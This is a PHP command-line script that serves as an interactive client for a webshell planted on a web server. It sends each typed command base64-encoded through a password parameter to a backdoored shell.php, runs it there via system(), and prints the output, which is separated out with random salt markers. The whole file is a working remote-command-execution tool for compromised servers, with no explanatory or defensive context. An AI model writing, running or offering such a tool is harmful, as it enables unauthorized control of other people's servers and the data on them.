<?php
if(!isset($argv[1]) || !isset($argv[2])){
        echo "{$argv[0]} http://localhost/shell.php pass\n";
        exit;
}

while(1){

        fwrite(STDOUT, "SHELL> ");
        $command = trim(fgets(STDIN));

        if($command == 'exit'){
                break;
        }

        $salt = get_salt(10);

        if(!is_bool(stripos($argv[1], '?'))){
                $url = $argv[1]."&{$argv[2]}=system(base64_decode(\$_GET[365234]));&365234=".urlencode(base64_encode("echo {$salt};{$command};echo {$salt};"));
        }else{
                $url = $argv[1]."?{$argv[2]}=system(base64_decode(\$_GET[365234]));&365234=".urlencode(base64_encode("echo {$salt};{$command};echo {$salt};"));
        }

        $resp = file_get_contents($url);
        $resp_arr = split($salt, $resp);
        if(count($resp_arr) >= 3){
                echo $resp_arr[1]."\n";
        }else{
                echo "错误：执行失败.\n";
        }

}


function get_salt($length = 8) {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $salt = '';
        for($i = 0; $i < $length; $i ++) {
	        $salt .= $chars [mt_rand ( 0, strlen ( $chars ) - 1 )];
        }
        return $salt;
}
